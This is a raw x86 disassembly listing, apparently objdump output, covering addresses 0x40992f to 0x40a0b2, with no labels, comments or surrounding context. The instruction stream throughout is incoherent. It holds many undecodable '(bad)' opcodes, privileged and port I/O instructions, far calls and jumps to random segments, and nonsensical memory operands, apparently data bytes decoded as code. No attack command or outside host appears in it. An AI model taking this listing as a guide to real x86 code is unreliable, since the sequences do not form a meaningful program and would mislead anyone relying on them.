  40992f:	xchg   ebp,eax
  409930:	add    edi,edi
  409932:	outs   dx,DWORD PTR ds:[esi]
  409933:	push   esi
  409934:	jb     0x4098f7
  409936:	xor    ebx,DWORD PTR [edx+edx*8+0x5c2dfb77]
  40993d:	mov    dl,bh
  40993f:	into   
  409940:	cld    
  409941:	sbb    BYTE PTR [eax],bl
  409943:	xchg   BYTE PTR [edx+edx*1-0x1e],dl
  409947:	jmp    0x68f0171b
  40994c:	loopne 0x409953
  40994e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40994f:	sbb    al,0x2
  409951:	inc    edi
  409952:	shl    BYTE PTR [ecx],cl
  409954:	scas   eax,DWORD PTR es:[edi]
  409955:	jp     0x4099b6
  409957:	xor    eax,esp
  409959:	test   al,0x58
  40995b:	shl    esi,1
  40995d:	das    
  40995e:	mov    ecx,0xf8f4cd51
  409963:	add    esi,DWORD PTR [ecx+ebx*2-0x6d]
  409967:	(bad)  
  409968:	sti    
  409969:	sbb    ecx,eax
  40996b:	sti    
  40996c:	pop    ebp
  40996d:	jl     0x40995c
  40996f:	lock add BYTE PTR ss:[esi-0x27ace81],0x6e
  409978:	mov    eax,ds:0x4cfb3fc6
  40997d:	lds    ecx,FWORD PTR [esi+0xf]
  409980:	push   ss
  409981:	cdq    
  409982:	add    al,0x16
  409984:	into   
  409985:	retf   
  409986:	ja     0x40992a
  409988:	jle    0x40993f
  40998a:	push   edx
  40998b:	test   eax,0x6ac24cf
  409990:	add    DWORD PTR [edi+0x4a],ebx
  409993:	stos   BYTE PTR es:[edi],al
  409994:	popa   
  409995:	lahf   
  409996:	mov    al,ds:0x2f1cf5f4
  40999b:	adc    al,0x11
  40999d:	clc    
  40999e:	cli    
  40999f:	adc    al,0x3e
  4099a1:	pop    ds
  4099a2:	sub    BYTE PTR [eax],al
  4099a4:	pop    edi
  4099a5:	adc    BYTE PTR [eax+0x47],0x84
  4099a9:	cmp    eax,0x768b94cc
  4099ae:	iret   
  4099af:	xchg   edi,eax
  4099b0:	fnstcw WORD PTR [esi]
  4099b2:	sub    bl,BYTE PTR [ebp+0x13]
  4099b5:	jp     0x409976
  4099b7:	pop    eax
  4099b8:	push   0x70abd13
  4099bd:	aas    
  4099be:	out    0x78,al
  4099c0:	mov    edx,0xd32ffa3a
  4099c5:	test   dh,bh
  4099c7:	mov    dh,0xec
  4099c9:	push   ds
  4099ca:	outs   dx,BYTE PTR ds:[esi]
  4099cb:	ja     0x4099c4
  4099cd:	stos   BYTE PTR es:[edi],al
  4099ce:	lods   al,BYTE PTR ds:[esi]
  4099cf:	bound  ecx,QWORD PTR [eax+edi*8+0x71b0acc3]
  4099d6:	enter  0xe37f,0xca
  4099da:	cmp    BYTE PTR [esi-0x21c7ef71],dh
  4099e0:	add    al,0xd8
  4099e2:	(bad)  
  4099e3:	neg    DWORD PTR [ebp+0x1d9eef35]
  4099e9:	sbb    DWORD PTR [esp+eiz*4+0x40944dec],edi
  4099f0:	mov    ebx,ecx
  4099f2:	inc    ebp
  4099f3:	pop    ebx
  4099f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099f5:	iret   
  4099f6:	int3   
  4099f7:	lods   al,BYTE PTR ds:[esi]
  4099f8:	pop    ebx
  4099f9:	inc    edx
  4099fa:	push   edx
  4099fb:	js     0x409a02
  4099fd:	imul   ebx,DWORD PTR [esi],0x68
  409a00:	pop    eax
  409a01:	std    
  409a02:	popf   
  409a03:	out    0xf1,eax
  409a05:	fdiv   DWORD PTR [ebp+ebx*8-0x524c3724]
  409a0c:	icebp  
  409a0d:	hlt    
  409a0e:	stos   BYTE PTR es:[edi],al
  409a0f:	mov    edx,0xbf054544
  409a14:	pop    ecx
  409a15:	push   0xffffffec
  409a17:	rcr    BYTE PTR [edi-0x62],cl
  409a1a:	xchg   edx,eax
  409a1b:	pop    esi
  409a1c:	(bad)  [edx-0x17b7508e]
  409a22:	call   0x21ba:0x8142ef92
  409a29:	xchg   esp,eax
  409a2a:	out    0xdd,eax
  409a2c:	push   ebp
  409a2d:	retf   0x77e0
  409a30:	loop   0x409a09
  409a32:	mov    eax,ds:0xed30b9eb
  409a37:	mov    edi,0x21557038
  409a3c:	retf   0x3f72
  409a3f:	mov    ds:0x8118fb9f,eax
  409a44:	das    
  409a45:	aas    
  409a46:	add    al,0x60
  409a48:	pop    ebp
  409a49:	jge    0x4099cc
  409a4b:	sub    edi,0x448d67ae
  409a51:	pop    es
  409a52:	and    cl,0x5f
  409a55:	pop    es
  409a56:	ret    
  409a57:	cmp    al,0x27
  409a59:	(bad)  
  409a5a:	lea    ebp,[ecx-0x2e]
  409a5d:	sahf   
  409a5e:	mov    ebx,esp
  409a60:	dec    esp
  409a61:	shl    BYTE PTR ds:0x3ee8b906,1
  409a67:	rol    ch,1
  409a69:	shl    BYTE PTR [edx+ebx*8+0x7f],0xf6
  409a6e:	jno    0x409ac1
  409a70:	daa    
  409a71:	adc    cl,BYTE PTR [ebx]
  409a73:	inc    ecx
  409a74:	sub    eax,0x22e6f3fb
  409a79:	mov    al,0xb3
  409a7b:	mov    edi,DWORD PTR [edi+0x6d58346d]
  409a81:	pop    ecx
  409a82:	shl    BYTE PTR fs:[esi],0x9c
  409a86:	mov    ch,BYTE PTR [ecx-0x18]
  409a89:	pop    edx
  409a8a:	push   ecx
  409a8b:	jge    0x409a60
  409a8d:	and    DWORD PTR [ebx-0x30],ecx
  409a90:	sahf   
  409a91:	outs   dx,DWORD PTR ds:[esi]
  409a92:	dec    esp
  409a93:	lods   eax,DWORD PTR ds:[esi]
  409a94:	fcomp  DWORD PTR [edi+eax*2+0x617c91ea]
  409a9b:	mov    esp,0xaf80f865
  409aa0:	test   DWORD PTR [eax],esp
  409aa2:	ud0    ecx,DWORD PTR [ecx]
  409aa5:	call   0xf0f49f8
  409aaa:	loopne 0x409b1b
  409aac:	xor    al,0x4e
  409aae:	inc    ebp
  409aaf:	ror    ch,cl
  409ab1:	xchg   DWORD PTR [eax],ecx
  409ab3:	popf   
  409ab4:	mov    ds:0xd035bc86,eax
  409ab9:	int    0x88
  409abb:	or     eax,0xbff520d4
  409ac0:	push   edx
  409ac1:	les    eax,FWORD PTR [ebx+0x4e]
  409ac4:	repnz cdq 
  409ac6:	(bad)  
  409ac7:	imul   eax,DWORD PTR [esi+0x24089a2f],0x29
  409ace:	fs pop esp
  409ad0:	ror    DWORD PTR [esi],1
  409ad2:	push   es
  409ad3:	and    DWORD PTR [edi-0x6b],edi
  409ad6:	fcom   QWORD PTR [edi]
  409ad8:	(bad)  [ecx]
  409ada:	(bad)  
  409adb:	inc    esp
  409adc:	fidivr DWORD PTR [esp+esi*4-0x626779b4]
  409ae3:	clc    
  409ae4:	or     al,0x76
  409ae6:	inc    ebx
  409ae7:	mov    WORD PTR ds:0x2b6f8405,fs
  409aed:	jge    0x409ad1
  409aef:	mov    bl,0x19
  409af1:	test   dh,cl
  409af3:	cli    
  409af4:	ss push 0x1a
  409af7:	sbb    al,0xb8
  409af9:	aam    0x67
  409afb:	hlt    
  409afc:	adc    eax,0x6529554e
  409b01:	(bad)  
  409b02:	mov    ds:0xa5daa4c1,eax
  409b07:	push   0x41
  409b09:	cmp    BYTE PTR [edx+ebx*2],dh
  409b0c:	fild   DWORD PTR [eax+0x43206132]
  409b12:	mov    bl,0x8d
  409b14:	js     0x409b27
  409b16:	pushf  
  409b17:	imul   eax,DWORD PTR [ecx],0x5eac9496
  409b1d:	lea    esi,[eax-0x49]
  409b20:	int3   
  409b21:	inc    ecx
  409b22:	adc    sp,WORD PTR [ebp+edx*1-0x1b3eb139]
  409b2a:	pop    edx
  409b2b:	outs   dx,BYTE PTR ds:[esi]
  409b2c:	popa   
  409b2d:	xchg   esp,eax
  409b2e:	and    BYTE PTR [ecx],0x34
  409b31:	lock add dh,dh
  409b34:	outs   dx,DWORD PTR ds:[esi]
  409b35:	xchg   DWORD PTR ss:[edx+ebx*4+0x23806613],esp
  409b3d:	lods   al,BYTE PTR ds:[esi]
  409b3e:	popf   
  409b3f:	push   es
  409b40:	mov    esp,edx
  409b42:	inc    esi
  409b43:	je     0x409afb
  409b45:	test   ebp,ebx
  409b47:	stos   DWORD PTR es:[edi],eax
  409b48:	pop    ebx
  409b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b4a:	sbb    dl,ch
  409b4c:	mov    cl,0x3d
  409b4e:	mov    ah,0x80
  409b50:	or     DWORD PTR [ebx],edx
  409b52:	jle    0x409b51
  409b54:	pop    edx
  409b55:	adc    ch,BYTE PTR [ebx+eax*4+0x17]
  409b59:	sbb    ch,BYTE PTR [esi]
  409b5b:	add    bh,BYTE PTR [eax]
  409b5d:	cmp    ebx,ecx
  409b5f:	in     eax,dx
  409b60:	cs inc eax
  409b62:	cmp    BYTE PTR [ecx],cl
  409b64:	sbb    eax,0x27ffdb17
  409b69:	ss (bad) 
  409b6c:	cmp    eax,0xa959633
  409b71:	mov    dl,0x28
  409b73:	scas   al,BYTE PTR es:[edi]
  409b74:	call   0xfa2d:0x59595c25
  409b7b:	dec    eax
  409b7c:	sbb    al,0x7e
  409b7e:	and    eax,0x9516f822
  409b83:	popf   
  409b84:	dec    edx
  409b85:	scas   al,BYTE PTR es:[edi]
  409b86:	les    edi,FWORD PTR [ebp+0x1c4fd582]
  409b8c:	adc    BYTE PTR [ebx+0x7a42351a],0x60
  409b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b94:	repz mov edi,0xf892098a
  409b9a:	pop    ss
  409b9b:	jns    0x409b7c
  409b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b9e:	ins    BYTE PTR es:[edi],dx
  409b9f:	xchg   ebp,eax
  409ba0:	pop    edi
  409ba1:	ds arpl di,sp
  409ba4:	aad    0x58
  409ba6:	addr16 in eax,dx
  409ba8:	sbb    esp,DWORD PTR [edx-0x56c6d780]
  409bae:	jl     0x409bd7
  409bb0:	cmp    eax,0xfb5a6cb2
  409bb5:	aam    0xfc
  409bb7:	xor    esi,DWORD PTR ds:0x9f8144e3
  409bbd:	int    0xa6
  409bbf:	icebp  
  409bc0:	mov    cl,0x4e
  409bc2:	inc    ebx
  409bc3:	bound  ebx,QWORD PTR [ecx]
  409bc5:	push   esi
  409bc6:	push   ecx
  409bc7:	cmp    edi,edx
  409bc9:	out    dx,al
  409bca:	mov    bh,0x19
  409bcc:	dec    edi
  409bcd:	add    esi,edi
  409bcf:	xchg   edi,eax
  409bd0:	iret   
  409bd1:	das    
  409bd2:	or     al,0xe4
  409bd4:	outs   dx,DWORD PTR ds:[esi]
  409bd5:	adc    edx,0xb
  409bd8:	sub    BYTE PTR [esi+edx*4+0x49],0xc6
  409bdd:	sti    
  409bde:	mov    ebx,0x2c96ee44
  409be3:	inc    ecx
  409be4:	sub    dh,dh
  409be6:	mov    al,ds:0x846d473f
  409beb:	jno    0x409c47
  409bed:	xor    al,0x7e
  409bef:	pop    ecx
  409bf0:	push   0xb82945e1
  409bf5:	call   0xfcca:0xbaafa905
  409bfc:	inc    esp
  409bfd:	xchg   esp,eax
  409bfe:	aam    0xa7
  409c00:	scas   al,BYTE PTR es:[edi]
  409c01:	xor    DWORD PTR [esi+eax*2],0xffffff94
  409c05:	sbb    DWORD PTR [eax],0x2bbbbc07
  409c0b:	jg     0x409bbc
  409c0d:	sbb    al,0x6b
  409c0f:	pop    esi
  409c10:	mov    eax,ebx
  409c12:	fwait
  409c13:	cmc    
  409c14:	addr16 sahf 
  409c16:	popa   
  409c17:	sti    
  409c18:	jnp    0x409ba4
  409c1a:	call   0x247f011e
  409c1f:	in     eax,0x48
  409c21:	loope  0x409c26
  409c23:	pushf  
  409c24:	frstor ds:0x899b7c92
  409c2a:	jnp    0x409c58
  409c2c:	ins    BYTE PTR es:[edi],dx
  409c2d:	and    eax,0x61ed5316
  409c32:	popf   
  409c33:	xchg   esi,eax
  409c34:	stc    
  409c35:	dec    esi
  409c36:	lds    esp,FWORD PTR [ecx-0xe]
  409c39:	or     BYTE PTR [ebx+0x19],ah
  409c3c:	mov    cs,esp
  409c3e:	inc    esp
  409c3f:	push   ebp
  409c40:	out    dx,eax
  409c41:	ins    BYTE PTR es:[edi],dx
  409c42:	(bad)  
  409c43:	mov    bh,0x97
  409c45:	push   0xc6a22a89
  409c4a:	sbb    BYTE PTR [ebx],bh
  409c4c:	addr16 jmp 0x9af33b92
  409c52:	inc    ebx
  409c53:	imul   esi,esi,0x6d4addb5
  409c59:	lods   al,BYTE PTR ds:[esi]
  409c5b:	adc    BYTE PTR [ebx-0x46098363],al
  409c61:	sar    al,0x39
  409c64:	mov    ss,WORD PTR [esi+0x7ab53061]
  409c6a:	or     al,0xce
  409c6c:	mov    dh,0x50
  409c6e:	test   DWORD PTR ss:[eax+esi*1],0x5165e08e
  409c76:	clc    
  409c77:	pushf  
  409c78:	jg     0x409cc8
  409c7a:	popf   
  409c7b:	nop
  409c7c:	rcl    DWORD PTR [edi+eax*2-0x769b98ab],1
  409c83:	and    eax,0xf6727173
  409c88:	clc    
  409c89:	mov    bl,0x57
  409c8b:	adc    eax,0x7c9f6db3
  409c90:	add    BYTE PTR [eax],cl
  409c92:	ins    BYTE PTR es:[edi],dx
  409c93:	pop    ecx
  409c94:	out    0xc7,al
  409c96:	jg     0x409c3f
  409c98:	xlat   BYTE PTR ds:[ebx]
  409c99:	dec    ecx
  409c9a:	loop   0x409c66
  409c9c:	ret    
  409c9d:	in     al,dx
  409c9e:	cdq    
  409c9f:	adc    DWORD PTR [ebx+0x12],esp
  409ca2:	fcom   DWORD PTR [eax+eax*1+0x62]
  409ca6:	in     al,0x23
  409ca8:	cmp    DWORD PTR [edi],0xffffffd2
  409cab:	xor    al,0x14
  409cad:	inc    ebx
  409cae:	aaa    
  409caf:	or     eax,0x8843aab2
  409cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb5:	test   BYTE PTR [ebp-0x21],0x32
  409cb9:	out    dx,eax
  409cba:	fidivr WORD PTR [edx]
  409cbc:	(bad)  
  409cbd:	jbe    0x409c75
  409cbf:	aam    0xe4
  409cc1:	stc    
  409cc2:	stc    
  409cc3:	rol    ah,cl
  409cc5:	push   cs
  409cc6:	inc    esi
  409cc7:	mov    dh,0x98
  409cc9:	jge    0x409cc5
  409ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ccd:	pop    esi
  409cce:	aas    
  409ccf:	mov    ebx,0x1544b0ab
  409cd4:	test   cl,0x6f
  409cd7:	leave  
  409cd8:	add    al,ah
  409cda:	push   cs
  409cdb:	push   0xffffffe8
  409cdd:	sbb    eax,0x24885ec9
  409ce2:	sbb    dh,BYTE PTR [eax+0x61]
  409ce5:	cwde   
  409ce6:	mov    ecx,0x6e4c4292
  409ceb:	push   0xffffffe7
  409ced:	lea    esi,[edi+0x5b6296c1]
  409cf3:	push   esp
  409cf4:	jg     0x409cee
  409cf6:	and    dl,BYTE PTR [ecx+0x44]
  409cf9:	sahf   
  409cfa:	pop    es
  409cfb:	inc    eax
  409cfc:	js     0x409c9d
  409cfe:	pop    ebx
  409cff:	and    al,0xa6
  409d01:	loopne 0x409d1d
  409d03:	in     al,dx
  409d04:	add    eax,DWORD PTR [eax]
  409d06:	popf   
  409d07:	jnp    0x409d42
  409d09:	imul   edx,ebp,0xe1f310cc
  409d0f:	jmp    0x409d5f
  409d11:	aaa    
  409d12:	jo     0x409d21
  409d14:	add    DWORD PTR [ecx],ebx
  409d16:	ds nop
  409d18:	sub    ch,BYTE PTR [ebx-0x2b]
  409d1b:	mov    esi,0x31b9af18
  409d20:	addr16 mov eax,0x5e141920
  409d26:	cmp    eax,0x4e858ed3
  409d2b:	push   ebp
  409d2c:	rol    BYTE PTR [ebx],cl
  409d2e:	add    dh,BYTE PTR [ecx+0x26]
  409d31:	jne    0x409d4d
  409d33:	aad    0xf
  409d35:	and    eax,0xaeb2de4
  409d3a:	push   esp
  409d3b:	and    cl,BYTE PTR [esi-0x2bf3aed3]
  409d41:	or     cl,BYTE PTR [ebx]
  409d43:	mov    edi,0xda5bc8a8
  409d48:	cs mov dh,0x81
  409d4b:	or     edx,DWORD PTR [edx-0x30]
  409d4e:	inc    eax
  409d4f:	xor    eax,0x5ceebeac
  409d54:	cmp    ecx,esp
  409d56:	mov    esp,0xa83e5368
  409d5b:	pop    eax
  409d5c:	xor    DWORD PTR [esi-0x2a],ebp
  409d5f:	and    DWORD PTR [edx-0x472eb846],0x61
  409d66:	lods   eax,DWORD PTR ds:[esi]
  409d67:	cld    
  409d68:	xchg   BYTE PTR [ecx+0x5d02105f],cl
  409d6e:	js     0x409cf8
  409d70:	out    0xa8,eax
  409d72:	sub    bl,BYTE PTR [edx-0x13]
  409d75:	xchg   esi,eax
  409d76:	mov    al,0x1e
  409d78:	ret    
  409d79:	pop    ds
  409d7a:	jmp    0x409d1c
  409d7c:	hlt    
  409d7d:	cwde   
  409d7e:	popa   
  409d7f:	je     0x409dd5
  409d81:	sahf   
  409d82:	and    DWORD PTR [eax-0xd],edi
  409d85:	js     0x409d5c
  409d87:	mov    BYTE PTR [edx-0x36],al
  409d8a:	xchg   esi,eax
  409d8b:	mov    BYTE PTR [eax],al
  409d8d:	inc    edi
  409d8e:	jo     0x409d1f
  409d90:	gs leave 
  409d92:	sbb    al,0x89
  409d94:	(bad)  
  409d95:	rcr    DWORD PTR [edi],cl
  409d97:	ficom  WORD PTR [eax+0x2b]
  409d9a:	and    BYTE PTR [edx-0x11f5ec4f],0xd4
  409da1:	ror    BYTE PTR [edx],1
  409da3:	call   FWORD PTR [eax+0x379d89c1]
  409da9:	in     eax,dx
  409daa:	sub    ebx,DWORD PTR [edi]
  409dac:	lock imul esp,DWORD PTR [ecx+0x13f5c698],0x45
  409db4:	out    dx,al
  409db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db6:	aas    
  409db7:	lahf   
  409db8:	sub    eax,0xc93a0c14
  409dbd:	jb     0x409dbd
  409dbf:	jle    0x409d61
  409dc1:	aam    0x67
  409dc3:	shr    ebx,0xc6
  409dc6:	mov    WORD PTR [ecx],es
  409dc8:	sub    eax,0xef82401c
  409dcd:	jp     0x409dda
  409dcf:	dec    cl
  409dd1:	jne    0x409d95
  409dd3:	cmp    dl,BYTE PTR [ebp+0x3e9b3742]
  409dd9:	and    al,0x84
  409ddb:	xchg   edx,eax
  409ddc:	clc    
  409ddd:	scas   ax,WORD PTR es:[edi]
  409ddf:	or     edi,edi
  409de1:	enter  0xf724,0x45
  409de5:	cmp    bl,BYTE PTR ds:0x55b1a48d
  409deb:	push   0xe8845c38
  409df0:	fisub  DWORD PTR [ebx+0x692d04e5]
  409df6:	mov    al,BYTE PTR [ebx]
  409df8:	mov    eax,ds:0x8dd0e3ee
  409dfd:	std    
  409dfe:	scas   eax,DWORD PTR es:[edi]
  409dff:	retf   
  409e00:	or     bh,bl
  409e02:	es mov cl,0xd2
  409e05:	mov    ds:0x49d86c20,al
  409e0a:	pop    edx
  409e0b:	stc    
  409e0c:	retf   0x223a
  409e0f:	gs push ecx
  409e11:	mov    esp,0x4ddfb673
  409e16:	gs iret 
  409e18:	test   DWORD PTR [ebp-0x4],ebp
  409e1b:	cs jbe 0x409e50
  409e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e1f:	shr    BYTE PTR [edi],0x89
  409e22:	lds    edi,FWORD PTR [esi+0x4fc64037]
  409e28:	loope  0x409e37
  409e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e2b:	daa    
  409e2c:	fdiv   st,st(0)
  409e2e:	leave  
  409e2f:	and    bl,ch
  409e31:	ss mov bh,0x6
  409e34:	adc    eax,0x1b7401bf
  409e39:	and    eax,0xa61a0df8
  409e3e:	mov    al,0xaf
  409e40:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e42:	pusha  
  409e43:	adc    al,0xc0
  409e45:	inc    ebx
  409e46:	hlt    
  409e47:	adc    DWORD PTR [ebx],0x9ab23663
  409e4d:	pop    eax
  409e4e:	adc    al,0x62
  409e50:	popf   
  409e51:	jae    0x409ea6
  409e53:	push   esp
  409e54:	pop    es
  409e55:	icebp  
  409e56:	inc    esp
  409e57:	ins    DWORD PTR es:[edi],dx
  409e58:	aad    0x74
  409e5a:	xchg   edi,eax
  409e5b:	fstp   TBYTE PTR [ebp+0x60]
  409e5e:	repnz (bad) 
  409e60:	ja     0x409e61
  409e62:	cld    
  409e63:	lea    edi,[ebp-0x4cc73b12]
  409e69:	mov    bl,0x82
  409e6b:	dec    edx
  409e6c:	sahf   
  409e6d:	aad    0x7f
  409e6f:	xor    ah,BYTE PTR [edi]
  409e71:	mov    esi,DWORD PTR [ebx+0xe]
  409e74:	pop    DWORD PTR [esi-0x456a1aab]
  409e7a:	out    0x9a,al
  409e7c:	inc    ecx
  409e7d:	cmp    eax,0x16a01a75
  409e82:	inc    esp
  409e83:	leave  
  409e84:	out    0x43,al
  409e86:	test   DWORD PTR [ebx-0x54797b06],eax
  409e8c:	test   DWORD PTR [ecx+0x39377068],edx
  409e92:	xchg   esi,eax
  409e93:	push   esp
  409e94:	(bad)  [esi]
  409e96:	jmp    0xbf233626
  409e9b:	(bad)  
  409e9c:	fnstcw WORD PTR [edi+esi*4-0x19]
  409ea0:	fidiv  WORD PTR [ebx+ebp*2-0x42]
  409ea4:	mov    dh,0x42
  409ea6:	add    eax,0x341c4fa5
  409eab:	pop    edx
  409eac:	jmp    0x409e9a
  409eae:	loope  0x409eb2
  409eb0:	or     bh,BYTE PTR [ebx+0x6edc0b5f]
  409eb6:	jg     0x409e63
  409eb8:	mov    DWORD PTR [edx-0x23],edi
  409ebb:	icebp  
  409ebc:	arpl   WORD PTR ds:0x656ec73f,bx
  409ec2:	ror    BYTE PTR [ebx],cl
  409ec4:	jl     0x409e60
  409ec6:	xor    eax,0xf4da7844
  409ecb:	and    ebp,ecx
  409ecd:	adc    al,0x27
  409ecf:	inc    ebx
  409ed0:	sub    cl,BYTE PTR [eax+0x58]
  409ed3:	push   ds
  409ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed5:	mov    eax,ds:0xae99eb7b
  409eda:	inc    esp
  409edb:	cli    
  409edc:	fild   QWORD PTR [ebx]
  409ede:	mov    bh,0x68
  409ee0:	rcr    DWORD PTR [eax],1
  409ee2:	xchg   ebx,eax
  409ee3:	sub    DWORD PTR [ecx-0x64051bc0],ebx
  409ee9:	ds leave 
  409eeb:	aaa    
  409eec:	inc    ebp
  409eed:	mov    ecx,0x20d80e24
  409ef2:	dec    ebx
  409ef3:	push   ss
  409ef4:	adc    esi,DWORD PTR [edx+0x27]
  409ef7:	jbe    0x409f69
  409ef9:	push   0x25
  409efb:	and    dh,al
  409efd:	arpl   ax,ax
  409eff:	dec    ecx
  409f00:	nop
  409f01:	jo     0x409f1e
  409f03:	mov    WORD PTR [eax],?
  409f05:	and    DWORD PTR [edi],ebx
  409f07:	lds    edi,FWORD PTR ds:0xdbb36964
  409f0d:	add    al,0xe5
  409f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f10:	sub    al,0x20
  409f12:	sbb    al,0x42
  409f14:	mov    DWORD PTR [eax+0x1a5c0bb3],esi
  409f1a:	das    
  409f1b:	mov    esp,0xf7d4a763
  409f20:	jo     0x409f68
  409f22:	int3   
  409f23:	dec    edx
  409f24:	lahf   
  409f25:	outs   dx,BYTE PTR ds:[esi]
  409f26:	or     eax,0x99b1298a
  409f2b:	adc    eax,0xc39a608d
  409f30:	pop    ebx
  409f31:	jns    0x409f54
  409f33:	out    0x5e,eax
  409f35:	or     dl,al
  409f37:	adc    dh,dh
  409f39:	cmp    ebp,DWORD PTR [esi+0x22]
  409f3c:	xchg   edi,eax
  409f3d:	inc    esi
  409f3e:	add    eax,0xf0cc2e6b
  409f43:	sub    eax,0x80e555d1
  409f48:	inc    eax
  409f49:	and    al,BYTE PTR [eax]
  409f4b:	clc    
  409f4c:	icebp  
  409f4d:	cld    
  409f4e:	cli    
  409f4f:	cwde   
  409f50:	adc    eax,0x30a22b39
  409f55:	sbb    DWORD PTR [eax],ecx
  409f57:	into   
  409f58:	push   ss
  409f59:	stos   BYTE PTR es:[edi],al
  409f5a:	cwde   
  409f5b:	mov    edx,0x88e880d6
  409f60:	out    dx,eax
  409f61:	popa   
  409f62:	mov    ah,0x5c
  409f64:	shl    ah,1
  409f66:	scas   eax,DWORD PTR es:[edi]
  409f67:	idiv   BYTE PTR [edi-0x56]
  409f6a:	jecxz  0x409fce
  409f6c:	jl     0x409f8c
  409f6e:	dec    esp
  409f6f:	(bad)  
  409f70:	sahf   
  409f71:	jmp    0x5b1a6e1
  409f76:	jo     0x409f50
  409f78:	or     BYTE PTR [ebx+edi*2+0x5b908908],bl
  409f7f:	jns    0x409faa
  409f81:	inc    esp
  409f82:	adc    al,0xca
  409f84:	repnz cli 
  409f86:	rol    DWORD PTR [ebx+0xb],cl
  409f89:	sub    dh,BYTE PTR [ebp-0x6f4eb63e]
  409f8f:	popf   
  409f90:	popf   
  409f91:	cli    
  409f92:	jnp    0x409f38
  409f94:	pop    edx
  409f95:	xchg   ebp,eax
  409f96:	iret   
  409f97:	jno    0x409fe3
  409f99:	dec    esi
  409f9a:	push   es
  409f9b:	loopne 0x409f7b
  409f9d:	and    dh,al
  409f9f:	add    eax,0x12856102
  409fa4:	cli    
  409fa5:	cmp    DWORD PTR [ecx+0x22c05814],eax
  409fab:	std    
  409fac:	jo     0x40a024
  409fae:	xchg   esi,eax
  409faf:	sbb    al,0xd5
  409fb1:	repnz xor cl,BYTE PTR es:[ecx]
  409fb5:	or     eax,0x16e238d2
  409fba:	pop    edi
  409fbb:	xchg   esi,eax
  409fbc:	loope  0x409f4a
  409fbe:	sahf   
  409fbf:	xchg   ebp,eax
  409fc0:	xchg   ecx,eax
  409fc1:	dec    eax
  409fc2:	and    al,0x19
  409fc4:	stos   BYTE PTR es:[edi],al
  409fc5:	sahf   
  409fc6:	fsub   QWORD PTR [esi]
  409fc8:	clc    
  409fc9:	ins    BYTE PTR es:[edi],dx
  409fca:	hlt    
  409fcb:	pop    es
  409fcc:	inc    edx
  409fcd:	hlt    
  409fce:	out    0x44,eax
  409fd0:	sub    eax,0x974b4fe
  409fd5:	mov    gs,eax
  409fd7:	push   esi
  409fd8:	hlt    
  409fd9:	sti    
  409fda:	rcl    DWORD PTR [edx+0xcf372e1],0xd2
  409fe1:	test   al,0x2d
  409fe3:	ret    
  409fe4:	pop    edx
  409fe5:	test   al,0x67
  409fe7:	das    
  409fe8:	aaa    
  409fe9:	call   FWORD PTR [ebp-0x159e21a1]
  409fef:	sub    eax,0x881eb52
  409ff4:	(bad)  
  409ff5:	das    
  409ff6:	push   es
  409ff7:	push   esp
  409ff8:	in     eax,0xab
  409ffa:	mov    ebp,0x8e182052
  409fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a000:	xor    cl,BYTE PTR [eax+0xa1608c6]
  40a006:	push   esp
  40a007:	stos   DWORD PTR es:[edi],eax
  40a008:	xchg   BYTE PTR [ecx-0x5e],ah
  40a00b:	loop   0x409f9b
  40a00d:	jb     0x409fc0
  40a00f:	adc    eax,0xe3fa2354
  40a014:	inc    ebx
  40a015:	dec    ebx
  40a016:	xchg   ecx,eax
  40a017:	sub    eax,0xb0f5b57b
  40a01c:	enter  0xfc6a,0x9b
  40a020:	mov    ah,0x60
  40a022:	pop    ebp
  40a023:	fdiv   QWORD PTR [ebx+edi*2+0x63]
  40a027:	in     eax,0x37
  40a029:	mov    ah,0x55
  40a02b:	xchg   ebx,eax
  40a02c:	sub    eax,0xeaf65ec2
  40a031:	ffreep st(5)
  40a033:	call   DWORD PTR ds:0x9dac51f0
  40a039:	mov    edi,0xb727e72d
  40a03e:	loope  0x409fc7
  40a040:	inc    edx
  40a041:	popa   
  40a042:	dec    edi
  40a043:	xchg   DWORD PTR [edi-0x1cc65b85],ebp
  40a049:	dec    eax
  40a04a:	sbb    ebp,DWORD PTR [esi+ebp*4-0x7cef3696]
  40a051:	cdq    
  40a052:	out    0xc9,eax
  40a054:	(bad)  
  40a055:	std    
  40a056:	sub    eax,DWORD PTR [edx-0x2be52237]
  40a05c:	jnp    0x40a068
  40a05e:	mov    ecx,0xff7e4198
  40a063:	les    ebx,FWORD PTR [eax-0x4cdf5bc1]
  40a069:	into   
  40a06a:	add    eax,0xf96a806e
  40a06f:	xchg   ebp,eax
  40a070:	sbb    eax,0xbb58f611
  40a075:	stos   BYTE PTR es:[edi],al
  40a076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a077:	mov    dh,0xd3
  40a079:	push   0x54de8911
  40a07e:	cmp    eax,0x2e9a66bb
  40a083:	push   ebp
  40a084:	ret    0xd86c
  40a087:	sbb    bl,BYTE PTR [ecx-0x69]
  40a08a:	loopne 0x40a044
  40a08c:	mov    edx,0xd457a7d3
  40a091:	fild   DWORD PTR [ebx-0x5a]
  40a094:	inc    DWORD PTR [ecx+0x49]
  40a097:	inc    ecx
  40a098:	fs ss dec esi
  40a09b:	adc    DWORD PTR [ebp+0x70],0x3ccd6ff1
  40a0a2:	ror    ah,0xde
  40a0a5:	push   ds
  40a0a6:	inc    ecx
  40a0a7:	pop    es
  40a0a8:	bound  esi,QWORD PTR [ebp-0xa]
  40a0ab:	pop    es
  40a0ac:	sbb    esi,edx
  40a0ae:	dec    edi
  40a0af:	dec    edx
  40a0b0:	aad    0xa7
  40a0b2:	jmp    0x4f26:0xbefa13b4
